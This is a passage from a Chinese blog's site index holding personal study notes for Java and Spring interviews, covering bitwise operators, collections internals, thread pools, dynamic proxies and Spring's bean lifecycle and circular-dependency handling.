Query进行数据合并</a></li></ol><hr><h1 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h1><p><a href="http://jmockit.cn/index.htm">JMockit中文网</a></p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>总结</title>
      <link href="/posts/38577/"/>
      <url>/posts/38577/</url>
      
        <content type="html"><![CDATA[<h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>在 Java 中，整数通常使用补码表示。正数的补码表示和其原码相同，而负数的补码是其原码的反码加1。</p><p>推荐文章：<a href="https://blog.csdn.net/xiaochunyong/article/details/7748713">Java 位运算(移位、位与、或、异或、非)</a></p><blockquote><ul><li>左移( &lt;&lt; )：无论正数还是负数，都是在低位补0</li><li>右移( &gt;&gt; )：正数在高位补0，对于负数在高位补1</li><li>无符号右移( &gt;&gt;&gt; )：无论正数还是负数，都在高位插入0</li><li>位与( &amp; ) ：第一个操作数的的第n位于第二个操作数的第n位如果<strong>都是1</strong>，那么结果的第n为也为1，否则为0</li><li>位或( | )：第一个操作数的的第n位于第二个操作数的第n位<strong>只要有一个是1</strong>，那么结果的第n为也为1，否则为0</li><li>位异或( ^ )：第一个操作数的的第n位于第二个操作数的第n位<strong>相反</strong>，那么结果的第n为也为1，否则为0</li><li>位非( ~ )：操作数的第n位为1，那么结果的第n位为0，反之。</li></ul><p>注意：位非是一元操作符，其他是二元操作符</p></blockquote><h2 id="抽象类和接口的区别"><a href="#抽象类和接口的区别" class="headerlink" title="抽象类和接口的区别"></a>抽象类和接口的区别</h2><blockquote><ol><li><p>抽象类和接口都不能直接实例化。</p></li><li><p>抽象类可以有main方法，接口则不可以有。</p></li><li><p>抽象类可以有构造方法，接口则不可以有。</p></li><li><p>一个类可以通过<code>implements</code>实现多个接口，但是只能通过<code>extends</code>继承一个抽象类。</p></li><li><p>抽象类的成员变量可以是变量和常量；接口的成员变量只能是常量，默认修饰符是：<code>public static final</code></p></li><li><p>抽象类的成员方法可以是抽象方法（不能用<code>private</code>和<code>static</code>和<code>final</code>修饰）和非抽象方法；</p></li><li><p>接口的成员方法在 JDK 1.7 时只能定义抽象方法，JDK 1.8 时可以定义默认方法和静态方法，JDK 1.9时可以定义私有方法。默认修饰符是：<code>public</code></p></li></ol></blockquote><h2 id="上转型对象和下转型对象"><a href="#上转型对象和下转型对象" class="headerlink" title="上转型对象和下转型对象"></a>上转型对象和下转型对象</h2><p>推荐文章：<a href="https://blog.csdn.net/yuncaidaishu/article/details/88690799">Java对象类型向上转型和向下转型</a></p><blockquote><p>上转型：父类引用指向子类对象</p><ul><li>父类引用变量可以访问子类中属于父类的属性和方法（如果子类重写了父类的方法，则<strong>调用子类</strong>的方法），但是不能访问子类<strong>独有</strong>的属性和方法。</li><li>作用：减少重复的代码，对象实例化的时候可以根据不同需求实例化不同的对象。</li></ul><p>下转型：子类引用指向父类对象</p><ul><li>只有当这个父类对象原本就是子类对象通过向上转型得到的时候才能够成功转型。</li><li>作用：向上转型时 ，会丢失子类独有的属性和方法；可以通过向下转型再重新访问</li></ul></blockquote><h2 id="访问权限控制符有哪些"><a href="#访问权限控制符有哪些" class="headerlink" title="访问权限控制符有哪些"></a>访问权限控制符有哪些</h2><blockquote><table><thead><tr><th>访问权限控制符</th><th>本类</th><th>包内</th><th>包外子类</th><th>任何地方</th></tr></thead><tbody><tr><td>public</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>protected</td><td>√</td><td>√</td><td>√</td><td>×</td></tr><tr><td>无（default）</td><td>√</td><td>√</td><td>×</td><td>×</td></tr><tr><td>private</td><td>√</td><td>×</td><td>×</td><td>×</td></tr></tbody></table></blockquote><h2 id="重写与重载"><a href="#重写与重载" class="headerlink" title="重写与重载"></a>重写与重载</h2><p>推荐文章：<a href="https://blog.csdn.net/wintershii/article/details/80558739">Java—重写与重载的区别</a></p><blockquote><p><strong>区别：</strong></p><ol><li>重写实现的是运行时的多态，而重载实现的是编译时的多态。</li><li>重写的方法参数列表必须相同；而重载的方法参数列表必须不同（参数类型不同、参数个数不同或者二者都不同）。</li><li>重写的方法的返回值类型只能是<strong>父类类型或者父类类型的子类</strong>，而重载的方法对返回值类型没有要求。</li></ol><table><thead><tr><th align="left"></th><th align="left">重载</th><th align="left">重写</th></tr></thead><tbody><tr><td align="left">范围</td><td align="left">一般在一个类中</td><td align="left">父类与子类之间</td></tr><tr><td align="left">方法名</td><td align="left">相同</td><td align="left">相同</td></tr><tr><td align="left">访问权限</td><td align="left">可以不同</td><td align="left">可以不同（但是子类的可见性不能比父类的低）</td></tr><tr><td align="left">方法返回值</td><td align="left">可以不同</td><td align="left">相同</td></tr><tr><td align="left">参数类型</td><td align="left">不同（充分条件）</td><td align="left">相同</td></tr><tr><td align="left">参数个数</td><td align="left">不同（充分条件）</td><td align="left">相同</td></tr></tbody></table><p><strong>注意：</strong></p><ul><li>子类中重写方法的访问修饰符的限制 ＞&#x3D; 父类中被重写方法的访问修饰符（<code>public &gt; protected &gt; default &gt; private</code>)</li><li>重写方法一定不能抛出新的检查异常或者比被重写方法申明更加宽泛的检查型异常</li></ul></blockquote><h2 id="子类初始化的顺序"><a href="#子类初始化的顺序" class="headerlink" title="子类初始化的顺序"></a>子类初始化的顺序</h2><p>推荐文章：<a href="https://blog.csdn.net/xyajia/article/details/80922329">Java类的初始化顺序</a></p><blockquote><p>① 父类静态代码块和静态变量。</p><p>② 子类静态代码块和静态变量。</p><p>③ 父类普通代码块和普通变量。</p><p>④ 父类构造方法。</p><p>⑤ 子类普通代码块和普通变量。</p><p>⑥ 子类构造方法。</p><p><strong>扩展：</strong></p><ul><li><p>静态代码块和静态变量只加载一次</p></li><li><p>静态加载完后如果有main方法会先执行main方法</p></li><li><p>静态变量和静态代码块之间，普通变量和普通代码块之间的顺序取决于它们在类中出现的先后顺序。</p></li></ul></blockquote><h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><p>自动扩容机制：</p><p>推荐文章：<a href="https://blog.csdn.net/qq_26542493/article/details/88873168">ArrayList扩容机制(基于jdk1.8)</a></p><blockquote><ol><li>使用无参构造方法创建 ArrayList 时，实际上初始化赋值的是一个空数组。当向数组中添加第一个元素时，数组容量<strong>扩容为10</strong>；使用有参构造方法创建 ArrayList 时，容量是size。</li><li>如果最小扩容量大于数组的容量则需要调用<strong>grow方法</strong>进行扩容。</li><li>按照当前容量的1.5倍左右进行扩容（oldCapacity为偶数就是1.5倍，否则是1.5倍左右）</li><li>扩容是通过<code>Arrays.copyOf(elementData, newCapacity)</code>方法将原数组的内容复制到更大容量的新数组中，底层实际调用的是<code>System.arraycopy(...)</code>方法。</li></ol></blockquote><p>ArrayList和LinkedList的区别：</p><blockquote><ol><li>ArrayList 和  LinkedList 都是不同步的，也就是不保证线程安全；</li><li>ArrayList 底层是 <strong>Object 动态数组</strong>；LinkedList 底层是 <strong>双向链表</strong> ；</li><li>插入和删除受元素位置的影响：ArrayList需要考虑元素的位置移动和扩容，LinkedList则需要遍历到指定位置再操作；</li><li>当随机访问元素（get和set操作）时，ArrayList比LinkedList的效率更高，因为LinkedList是线性的数据存储方式，所以需要移动指针遍历链表，而 ArrayList可以通过数组下标索引</li></ol></blockquote><p>ArrayList和Vector的区别：</p><blockquote><ol><li><p>ArrayList 是 List 的主要实现类，Vector 是 List 的古老实现类，两者几乎是完全相同的。</p></li><li><p>Vector 是同步类(synchronized)，线程安全的，而 ArrayList 不是，因此开销比 ArrayList 要大，效率也不如ArrayList。</p></li><li><p>Vector 默认扩容是2倍，如果有指定增长因子，则新容量&#x3D;之前的容量+增长因子，而ArrayList 扩容是1.5倍。</p></li><li><p>ArrayList 存储数据的 Object 数组使用了 <code>transient</code> 关键字，而 Vector 的 Object 数组没有。（大概意思：被 <code>transient</code> 修饰的成员变量，在序列化的时候其值会被忽略，在被反序列化后， transient 变量的值被设为初始值， 如 int 型的是 0，对象型的是 null。）</p></li><li><p>ArrayList 调用无参构造器创建对象时，是在调用 add() 方法才对 ArrayList 的默认容量进行初始化，而Vector 在调用构造器时就对容量进行了初始化。</p></li></ol></blockquote><h2 id="HashMap（待）"><a href="#HashMap（待）" class="headerlink" title="HashMap（待）"></a>HashMap（待）</h2><p>推荐文章：</p><p><a href="https://blog.csdn.net/weixin_42814000/article/details/125035202">HashMap 的底层结构和原理</a></p><p><a href="https://blog.csdn.net/maohoo/article/details/81531925">老生常谈，HashMap的死循环【基于JDK1.7】</a></p><p><a href="https://blog.csdn.net/cy973071263/article/details/122869277">【Java集合】HashMap的tableSizeFor()源码详解</a></p><p><a href="https://blog.csdn.net/DD_Dddd/article/details/115427040">HashMap面试，看这一篇就够了</a></p><p><a href="https://blog.csdn.net/BASK2311/article/details/128691859">【精讲】深入剖析HashMap的底层原理</a></p><p><a href="https://blog.csdn.net/weixin_44688973/article/details/119865191">HashMap源码研究——源码一行一行的注释</a></p><p>红黑树，扩容机制，2的幂次方的原因</p><p>基本概念：</p><blockquote><ol><li>HashMap线程不安全的，效率高；<strong>可以存储null的key和value。</strong></li><li>桶(bucket)是存储元素的容器。哈希表通过哈希函数将键映射到一个特定的位置，该位置通常被称为桶。每个桶可以包含一个元素，也可以包含多个元素，桶内的数据结构可以是链表或红黑树结构。</li></ol></blockquote><p>JDK 7 和 JDK 8 的区别：</p><blockquote><ul><li>数据结构：<ul><li>JDK 7是数组+链表(即为链地址法)，内部数据节点是Entry类</li><li>JDK 8是数组+链表+红黑树(链表长度&gt;&#x3D;8)，内部数据节点是Node类</li></ul></li><li>插入位置：<ul><li>JDK 7：新添加的元素作为链表的头结点，新元素指向旧元素（多线程下扩容后可能导致循环链表的问题）</li><li>JDK 8：新添加的元素作为链表的尾结点或树的叶子结点，旧元素指向新元素（多线程下插入时可能导致数据丢失的问题）</li></ul></li><li>扩容机制：<ul><li>JDK 7扩容条件:元素个数 &gt; 容量(16) * 加载因子 (0.75) &amp;&amp; 插入的数组位置有元素存在</li><li>JDK 8扩容条件 :元素个数 &gt; 容量 (16) * 加载因子(0.75)</li></ul></li></ul></blockquote><p>数组长度是2的幂次方的原因及实现原理：</p><blockquote><p>实现原理tableSizeFor()方法：</p><ul><li>2的整数幂用二进制表示都是最高有效位为1，其余全是0</li><li>该方法的核心思想是，先将最高有效位以及其后的位都变为1，最后再+1，这样就会得到最高有效位的前一位是1，后面全是0</li><li>开始移位前先将容量-1，是为了避免给定容量已经是8，16这样2的幂次方时，容量变成两倍</li><li>最高有效位右移一位再或运算，可以得到最高位连续的两个1，右移两位再或运算，有四位变成了1，右移八位和十六位后可以保证32位的int类型整数最高有效位之后的位都能变为1</li><li>最后再+1就能得到大于等于大于等于initialCapacity的第一个2的幂次方</li></ul></blockquote><p>HashMap的默认负载因子：</p><blockquote><p><strong>默认负载因子是0.75。</strong></p><ul><li>负载因子越大密度越大，发生碰撞的几率越高，数组中的链表越容易长，造成查询或插入时的比较次数增多，性能会下降。</li><li>负载因子越小，就越容易触发扩容，数据密度也越小，意味着发生碰撞的几率越小，数组中的链表也就越短，查询和插入时比较的次数也越小，性能会更高。但是会浪费一定的内存空间。而且经常扩容也会影响性能。</li><li>选择0.75作为默认的负载因子是时间和空间成本上寻求的一种折中选择。</li></ul></blockquote><p>扩容机制：</p><blockquote><p><a href="https://blog.csdn.net/zhuzhianing/article/details/123962898">https://blog.csdn.net/zhuzhianing/article/details/123962898</a></p></blockquote><p>HashMap为什么线程不安全：<br>推荐文章：<a href="https://blog.csdn.net/maohoo/article/details/81531925">老生常谈，HashMap的死循环【基于JDK1.7】</a><br><a href="https://blog.csdn.net/zzu_seu/article/details/106669757">https://blog.csdn.net/zzu_seu/article/details/106669757</a><br><a href="https://blog.csdn.net/swpu_ocean/article/details/88917958">https://blog.csdn.net/swpu_ocean/article/details/88917958</a></p><h2 id="ConcurrentHashMap（待）"><a href="#ConcurrentHashMap（待）" class="headerlink" title="ConcurrentHashMap（待）"></a>ConcurrentHashMap（待）</h2><p><a href="https://blog.csdn.net/wuhuayangs/article/details/126049472">https://blog.csdn.net/wuhuayangs/article/details/126049472</a><br><a href="https://blog.csdn.net/zycxnanwang/article/details/105424734">https://blog.csdn.net/zycxnanwang/article/details/105424734</a><br><a href="https://blog.csdn.net/yunzhaji3762/article/details/113623168">https://blog.csdn.net/yunzhaji3762/article/details/113623168</a><br><a href="https://blog.csdn.net/wwj17647590781/article/details/118151008">https://blog.csdn.net/wwj17647590781/article/details/118151008</a></p><h2 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h2><p>推荐文章：<a href="https://blog.csdn.net/weixin_28760063/article/details/81266152">线程池原理</a></p><p>讲一下<code>ThreadPoolExecutor</code>的几个重要参数：</p><blockquote><ul><li><strong><code>corePoolSize</code>:</strong> 核心线程数，定义了最小可以同时运行的线程数量。</li><li><strong><code>workQueue</code>:</strong> 当新任务来的时候会先判断当前运行的线程数量是否达到核心线程数，如果达到的话，新任务就会被存放在任务缓存队列中。</li><li><strong><code>maximumPoolSize</code>:</strong> 当队列中存放的任务达到队列容量的时候，当前可以同时运行的线程数量变为最大线程数。</li><li><strong><code>keepAliveTime</code>:</strong> 当线程池中的线程数量大于 <code>corePoolSize</code> 的时候，如果这时没有新的任务提交，核心线程外的线程不会立即销毁，而是会等待，直到等待的时间超过了 <code>keepAliveTime</code>才会被回收销毁；</li><li><strong><code>unit</code>:</strong> <code>keepAliveTime</code> 参数的时间单位。</li><li><strong><code>threadFactory</code>:</strong> 线程工厂，主要用来创建线程。</li><li><strong><code>handler</code>:</strong> 任务拒绝策略。</li></ul></blockquote><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220514114654.png"></p><p>线程池的执行流程：</p><blockquote><ul><li>如果当前线程池中的线程数目小于corePoolSize，则每来一个任务，就会创建一个线程去执行这个任务；</li><li>如果当前线程池中的线程数目&gt;&#x3D;corePoolSize，则每来一个任务，会尝试将其添加到任务缓存队列当中，若添加成功，则该任务会等待空闲线程将其取出去执行；若添加失败（一般来说是任务缓存队列已满），则会尝试创建新的线程去执行这个任务（<strong>添加失败的任务</strong>）；</li><li>如果当前线程池中的线程数目达到maximumPoolSize，则会采取任务拒绝策略进行处理；</li><li>如果线程池中的线程数量大于 corePoolSize时，如果非线程空闲时间超过keepAliveTime，线程将被终止，直至线程池中的线程数目不大于corePoolSize；如果允许为核心池中的线程设置存活时间，那么核心池中的线程空闲时间超过keepAliveTime，线程也会被终止。</li></ul></blockquote><p>有哪几种任务缓存队列：</p><p>推荐文章：<a href="https://blog.csdn.net/nihaomabmt/article/details/81667481">线程池的三种缓存队列</a></p><blockquote><ul><li>**<code>ArrayBlockingQueue</code>**：基于数组的先进先出队列，此队列创建时必须指定大小；</li><li>**<code>LinkedBlockingQueue</code>**：基于链表的先进先出队列，如果创建时没有指定此队列大小，则默认为Integer.MAX_VALUE；</li><li><strong><code>SynchronousQueue</code></strong> ：它不会保存提交的任务，而是将直接新建一个线程来执行新来的任务。</li></ul></blockquote><p>有哪几种任务拒绝策略：</p><blockquote><ul><li><p><strong><code>ThreadPoolExecutor.AbortPolicy</code>：</strong> 丢弃任务并抛出 <code>RejectedExecutionException</code>异常。<strong>默认</strong></p></li><li><p><strong><code>ThreadPoolExecutor.DiscardPolicy</code>：</strong> 也是丢弃任务，但是不抛出异常。</p></li><li><p><strong><code>ThreadPoolExecutor.DiscardOldestPolicy</code>：</strong> 丢弃队列最前面的任务，然后重新尝试执行任务</p></li><li><p><strong><code>ThreadPoolExecutor.CallerRunsPolicy</code>：</strong> 由调用<code>execute</code>方法的线程运行被拒绝的任务</p></li></ul></blockquote><p>线程池有哪些：</p><p>推荐文章：<a href="https://blog.csdn.net/m0_37654384/article/details/109284322?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4-109284322-blog-89491035.pc_relevant_default&spm=1001.2101.3001.4242.3&utm_relevant_index=7">四种线程池</a></p><blockquote><ul><li><p><strong><code>CachedThreadPool</code><strong>：</strong>没有核心线程，非核心线程是无界的</strong>，空闲线程等待新任务的<strong>最长时间是60s</strong>，任务队列采用SynchronousQueue，适用于处理<strong>大量、耗时少</strong>的任务</p></li><li><p><strong><code>SecudleThreadPool</code><strong>：按照某种特定的计划执行线程中的任务，有核心线程，但也有非核心线程，非核心线程是无界的。任务队列采用DelayedWorkQueue，会将任务排序，适用于执行</strong>周期性</strong>的任务。</p></li><li><p><strong><code>SingleThreadPool</code><strong>：</strong>只有一个核心线程</strong>来执行任务，<strong>适用于有顺序</strong>的任务的应用场景。任务队列采用LinkedBlockingQueue</p></li><li><p><strong><code>FixedThreadPool</code><strong>：只有核心线程且数量固定，</strong>没有非核心线程</strong>。任务队列采用LinkedBlockingQueue</p></li></ul></blockquote><p>如何合理配置线程池的大小：</p><blockquote><p>最佳线程数目 &#x3D; （线程等待时间与线程CPU时间之比 + 1）* CPU核数</p><p>线程等待时间（比如IO时间）所占比例越高，需要越多线程。线程CPU时间所占比例越高，需要越少线程，减少线程上下文的切换。</p><p>可以通过控制台输入jconsole，打开图形监控界面，监控线程运行情况。</p></blockquote><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><p>推荐文章：<br><a href="https://blog.csdn.net/ju_362204801/article/details/90713500">Java中的代理模式——静态代理以及分析静态代理的缺点</a><br><a href="https://blog.csdn.net/ju_362204801/article/details/90714295">Java中动态代理的两种方式JDK动态代理和cglib动态代理以及区别</a></p><p>三种代理方式之间对比：</p><blockquote><ul><li>静态代理：<ul><li>实现：手写代理类，一是通过继承委托类的方式实现其子类，重写父类方法；二是与委托类实现共同的一个接口</li><li>特点：硬编码效率低，代码重用性不强</li></ul></li><li>JDK动态代理<ul><li>实现：代理类与委托类实现同一接口，主要是通过代理类实现<code>InvocationHandler</code>接口并重写<code>invoke</code>方法来进行动态代理的，在invoke方法中将对方法进行增强处理。</li><li>创建动态代理对象：<ul><li>Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] instance, InvocationHandler h)</li></ul></li><li>特点：底层使用反射机制进行方法的调用，代码复用率高。只能够代理实现了接口的委托类同时继承了Proxy类。</li></ul></li><li>CGLIB动态代理<ul><li>实现：代理类将被委托类作为自己的父类并为其中的<code>非final委托方法</code>创建两个方法，一个是与委托方法签名相同的方法，它在方法中会通过super调用委托方法；另一个是代理类独有的方法，在代理方法中，它会判断是否存在实现了<code>MethodInterceptor</code>接口的对象，若存在则将调用intercept方法对委托方法进行代理。</li><li>创建动态代理对象：<ul><li>Enhancer enhancer &#x3D; new Enhancer();</li><li>设置被代理类：enhancer.setSuperclass(Car.class);</li><li>设置回调函数：enhancer.setCallback(new MyMethodInterceptor());</li><li>创建代理对象：Car car &#x3D; (Car) enhancer.create();</li></ul></li><li>特点：底层方法的调用并不是通过反射来完成的，而是将方法全部存入一个数组中，通过数组索引直接进行方法调用（<strong>FastClass机制</strong>），可以在运行时对类或者是接口进行增强操作，且被代理类无需实现接口。</li></ul></li></ul></blockquote><p><code>动态代理不能对</code>final<code>类以及final、static、private方法进行代理，default和public方法可以。</code></p><p>Spring底层是如何选择哪种动态代理方式：</p><blockquote><p>Spring会根据具体的Bean是否有实现接口去选择动态代理方式，如果有实现接口，使用的是JDK动态代理的方式，如果没有实现接口，使用的是CGLIB动态代理的方式。</p></blockquote><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><h2 id="Spring的IoC理解"><a href="#Spring的IoC理解" class="headerlink" title="Spring的IoC理解"></a><strong>Spring的IoC理解</strong></h2><blockquote><p>IoC (Inversion of Control)就是控制反转，我们将对象的控制权转移给Spring，由 Spring 来负责控制对象的生命周期（比如创建、销毁）和对象间的依赖关系。</p><p>在IoC容器运行时，动态地为某个对象提供它所需要的外部依赖，是通过 DI (Dependency Injection)依赖注入来实现的。而 Spring 的 DI 是通过反射实现的。</p></blockquote><h2 id="Spring的AOP理解"><a href="#Spring的AOP理解" class="headerlink" title="Spring的AOP理解"></a><strong>Spring的AOP理解</strong></h2><p>推荐文章：<a href="https://blog.csdn.net/mu_wind/article/details/102758005">【SpringBoot-3】切面AOP实现权限校验：实例演示与注解全解</a></p><blockquote><p>AOP(Aspect Oriented Programming)是面向切面编程，在切面<code>(Aspect)</code>将相应通知<code>(Advice)</code>织入<code>(Weaving)</code>切点<code>(Pointcut)</code>指定的连接点<code>(Join point)</code>处。主要是通过动态代理来实现的。通过AOP可以帮我们实现到像事务、权限、日志和安全等方便的扩展。</p></blockquote><h2 id="Spring基于xml依赖注入四种方式"><a href="#Spring基于xml依赖注入四种方式" class="headerlink" title="Spring基于xml依赖注入四种方式"></a><strong>Spring基于xml依赖注入四种方式</strong></h2><p>推荐文章：<a href="https://blog.csdn.net/a745233700/article/details/89307518">Spring中bean的注入方式</a></p><blockquote><ul><li><p>构造器注入</p></li><li><p>set方法注入</p></li><li><p>静态工厂注入</p></li><li><p>实例工厂注入</p></li></ul><p><strong>注意：一般答前两种</strong></p></blockquote><h2 id="Spring的自动装配"><a href="#Spring的自动装配" class="headerlink" title="Spring的自动装配"></a><strong>Spring的自动装配</strong></h2><p>推荐文章：<a href="https://blog.csdn.net/weixin_38192427/article/details/108610810">Spring中的@Autowired自动装配</a></p><blockquote><p>自动装配也就是 Spring 会在容器中自动的查找，并自动的给 bean 装配及其关联的属性</p><p>Spring <strong>基于XML</strong>提供了 5 种自动装配策略：</p><ul><li>no：默认的方式是不进行自动装配的，通过手工设置ref属性来进行装配bean。</li><li>byName：通过bean的名称进行自动装配。</li><li>byType：通过参数的数据类型进行自动装配。</li><li>constructor：利用构造函数进行装配，并且构造函数的参数通过byType进行装配。</li><li>autodetect：自动探测，如果有构造方法，通过 construct的方式自动装配，否则使用byType的方式自动装配。 <code>Spring 3.0</code> 之后已经被标记为 <code>@Deprecated</code></li></ul><p>Spring<strong>基于注解</strong>的自动装配方式：</p><p>使用@Autowired、@Resourc或者@Inject注解来自动装配指定的bean。</p><ul><li><p>@Autowired默认是<code>byType</code> 装配注入的，默认情况下它要求依赖对象必须存在（可以设置它required属性为false）。如果匹配到类型的多个实例，再通过 <code>byName</code> 来确定 bean。可以使用@Qualifier来指定注入哪个beanName的bean。</p></li><li><p>@Resource默认是 <code>byName</code> 来装配注入的，只有当找不到与名称匹配的bean才会<code>byType</code> 来装配注入。</p></li><li><p>@Inject也是<code>byType</code> 来查找bean注入的，如果需要指定名称beanName，则可以结合使用@Named注解，而@Autowired是结合@Qualifier注解来指定名称beanName。</p></li></ul></blockquote><h2 id="Spring中的通知类型"><a href="#Spring中的通知类型" class="headerlink" title="Spring中的通知类型"></a>Spring中的通知类型</h2><blockquote><ul><li>Before（前置通知）：<code>@Before </code>指定的方法在切面切入目标方法之前执行</li><li>After（后置通知）: <code>@After </code>指定的方法在切面切入目标方法之后执行</li><li>After Retuning（返回通知）: <code>@AfterReturning</code> 可以用来捕获切入方法执行完之后的返回值，对返回值进行业务逻辑上的增强处理</li><li>After Throwing（异常通知）: 当被切方法执行过程中抛出异常时，会进入 <code>@AfterThrowing</code> 的方法中执行，在该方法中可以做一些异常的处理逻辑</li><li>Around（环绕通知）：如果需要目标方法执行之前和之后共享某种状态数据，则应该考虑使用<code>@Around</code>。尤其是需要使用增强处理阻止目标的执行，或需要改变目标方法的返回值时，则只能使用<code>@Around</code>增强处理了。</li></ul><p>执行顺序：</p><p>不抛异常：@Around @Before @AfterReturning @After @Around</p><p>抛异常：@Around @Before @AfterThrowing @After</p></blockquote><h2 id="bean的作用域"><a href="#bean的作用域" class="headerlink" title="bean的作用域"></a>bean的作用域</h2><p>推荐文章：<a href="https://blog.csdn.net/kongmin_123/article/details/82048392">Spring Bean的作用域</a></p><blockquote><ul><li><code>singleton</code>：在spring IoC容器仅存在一个Bean实例，Bean以单例方式存在，bean作用域范围的默认值。</li><li><code>prototype</code>：每次从容器中调用Bean时，都返回一个新的实例，即每次调用getBean()时，相当于执行newXxxBean()。</li><li><code>request</code>：每次HTTP请求都会创建一个新的Bean，该作用域仅适用于web的Spring WebApplicationContext环境。</li><li><code>session</code>：同一个HTTP Session共享一个Bean，不同Session使用不同的Bean。该作用域仅适用于web的Spring WebApplicationContext环境。</li><li><code>application</code>：限定一个Bean的作用域为ServletContext的生命周期。该作用域仅适用于web的Spring WebApplicationContext环境。</li></ul></blockquote><h2 id="bean的生命周期（待）"><a href="#bean的生命周期（待）" class="headerlink" title="bean的生命周期（待）"></a><strong>bean的生命周期</strong>（待）</h2><p>推荐文章：</p><ul><li><a href="https://xulinjie.blog.csdn.net/article/details/80086950?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.pc_relevant_default&utm_relevant_index=5">Spring 了解Bean的一生(生命周期)</a></li><li><a href="https://blog.csdn.net/a745233700/article/details/113840727">Spring的Bean加载流程</a></li></ul><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220422002324.png"></p><blockquote><p>（1）实例化Bean：</p><ul><li><p>对于BeanFactory容器，当客户向容器请求一个尚未初始化的bean时，或初始化bean的时候需要注入另一个尚未初始化的依赖时，容器就会调用createBean进行实例化。</p></li><li><p>对于ApplicationContext容器，当容器启动结束后，通过获取BeanDefinition对象中的信息，实例化所有的bean。</p></li></ul><p>（2）设置对象属性（依赖注入）：实例化后的对象被封装在BeanWrapper对象中，紧接着，Spring根据BeanDefinition中的信息以及通过BeanWrapper提供的设置属性的接口完成属性设置与依赖注入。</p><p>（3）处理Aware接口：Spring会检测该对象是否实现了xxxAware接口，通过Aware类型的接口，可以让我们拿到Spring容器的一些资源：</p><ul><li>如果这个Bean实现了BeanNameAware接口，会调用它实现的setBeanName(String beanId)方法，传入Bean的名字；</li><li>如果这个Bean实现了BeanClassLoaderAware接口，调用setBeanClassLoader()方法，传入ClassLoader对象的实例。</li><li>如果这个Bean实现了BeanFactoryAware接口，会调用它实现的setBeanFactory()方法，传递的是Spring工厂自身。</li><li>如果这个Bean实现了ApplicationContextAware接口，会调用setApplicationContext(ApplicationContext)方法，传入Spring上下文；</li></ul><p>（4）BeanPostProcessor前置处理：如果想对Bean进行一些自定义的前置处理，那么可以让Bean实现了BeanPostProcessor接口，那将会调用postProcessBeforeInitialization(Object obj, String s)方法。</p><p>（5）InitializingBean：如果Bean实现了InitializingBean接口，执行afeterPropertiesSet()方法。</p><p>（6）init-method：如果Bean在Spring配置文件中配置了 init-method 属性，则会自动调用其配置的初始化方法。</p><p>（7）BeanPostProcessor后置处理：如果这个Bean实现了BeanPostProcessor接口，将会调用postProcessAfterInitialization(Object obj, String s)方法；由于这个方法是在Bean初始化结束时调用的，所以可以被应用于内存或缓存技术；</p><p>以上几个步骤完成后，Bean就已经被正确创建了，之后就可以使用这个Bean了。</p><p>（8）DisposableBean：当Bean不再需要时，会经过清理阶段，如果Bean实现了DisposableBean这个接口，会调用其实现的destroy()方法；</p><p>（9）destroy-method：最后，如果这个Bean的Spring配置中配置了destroy-method属性，会自动调用其配置的销毁方法。</p></blockquote><h2 id="循环依赖（待）"><a href="#循环依赖（待）" class="headerlink" title="循环依赖（待）"></a><strong>循环依赖（待）</strong></h2><p>推荐文章：</p><ul><li><p><a href="https://blog.csdn.net/A_Java_Dog/article/details/117192587">Spring如何解决循环依赖</a></p></li><li><p><a href="https://louyuting.blog.csdn.net/article/details/77940767">Spring-bean的循环依赖以及解决方式</a></p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNTE3NjQ3MA==&mid=2247494774&idx=1&sn=b2a4f49aad1bd5838f610b48c010ba0f&chksm=c161810ff616081945b97e1e482804a9dee85ab43b111b01bd02d1f600c4dcc7ef3b776f60ee&token=1912489545&lang=zh_CN#rd">Spring循环依赖</a></p></li></ul><p>什么情况下循环依赖可以被处理？</p><blockquote><ul><li>出现循环依赖的Bean必须要是<code>单例</code>(singleton)。</li><li>依赖注入的方式<code>不能全是</code>构造器注入的方式，且beanName字母序在前的不能是构造器注入（只能解决setter方法的循环依赖，这是错误的）</li></ul></blockquote><p>Spring如何解决循环依赖的</p><p><code>实例化 -&gt; 属性注入 -&gt; 初始化</code></p><blockquote><p>Spring通过三级缓存解决了循环依赖</p><ul><li>一级缓存为<code>singletonObjects</code>，存放所有已经完全初始化的单例Bean</li><li>二级缓存为<code>earlySingletonObjects</code>，存放所有仅完成实例化，但还未进行属性注入和初始化的 Bean</li><li>三级缓存为<code>singletonFactories</code>，存放单例对象的工厂实例，用于创建对象，然后放入到二级缓存中</li></ul><ol><li>首先，获取单例 Bean 的时候会通过 BeanName 先去<strong>一级缓存</strong>查找有无完整的 Bean，如果找到则直接返回</li><li>否则会去看对应的 Bean 是否<strong>在创建中</strong>，如果不在创建中直接返回 null</li><li>如果在创建中则去<strong>二级缓存</strong>查找 Bean，如果找到则返回</li><li>否则会去<strong>三级缓存</strong>通过 BeanName 查找到对应的工厂，如果存在工厂则通过工厂创建 Bean ，并且放置到二级缓存中，然后删除对应的工厂</li><li>如果三个缓存都没找到，则返回 null</li><li>返回 null 之后，说明这个 Bean 还未创建，这个时候会标记这个 Bean <strong>正在创建中</strong>，然后再调用 createBean 来创建 Bean，而实际创建是调用方法 doCreateBean（执行实例化、属性注入和初始化）。</li><li>在实例化 Bean 之后，会往<strong>三级缓存</strong>塞入对应的工厂，而调用这个工厂的 getObject 